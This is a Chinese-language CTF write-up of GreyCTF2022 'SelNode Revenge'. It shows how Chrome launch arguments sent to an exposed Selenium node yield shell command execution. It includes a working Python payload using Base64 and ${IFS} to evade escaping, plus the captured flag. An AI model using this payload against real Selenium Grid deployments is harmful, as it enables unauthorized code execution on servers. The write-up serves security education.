# GreyCTF2022 - SelNode Revenge

## 题目简述

Revenge 仍公开 Selenium 节点，但只安装 Chrome，并要求直接在服务端执行 `/flag`。Chrome 的 `--utility-cmd-prefix` 会给 utility/browser 子进程添加命令前缀；结合 `--utility-and-browser` 可把可控启动参数变成 Linux 命令执行。

## 解题过程

命令中的斜杠会被 Selenium 转义为 `\u002f`，因此官方脚本先把任意命令 Base64 编码，使用不含斜杠的 shell 片段在目标端还原：

```python
encoded = base64.b64encode(command.encode()).decode()
payload = f'sh -c echo${{IFS}}{encoded}|base64${{IFS}}-d|bash'

options.add_argument('--no-sandbox')
options.add_argument('--headless')
options.add_argument('--utility-and-browser')
options.add_argument('--utility-cmd-prefix=' + payload)
driver = webdriver.Remote(command_executor=endpoint, options=options)
driver.get('data:text/html,trigger')
```

`${IFS}` 代替空格，避免参数解析提前拆分。创建会话并触发 Chrome 子进程后，前缀命令执行；令 `command` 运行 `/flag` 并把结果回传即可得到：

```text
grey{y0u_4r3_qu4l1f13d_45_r34l_h4ck3r_68c620210bd61385}
```

## 方法总结

浏览器启动参数属于代码执行边界，而不是普通配置。分析时要追踪 Selenium 对 JSON 参数的转义、Chrome 对 wrapper 的二次解析以及 shell 的最终分词；Base64 和 `${IFS}` 用于跨越多层解析，并不是漏洞本身。
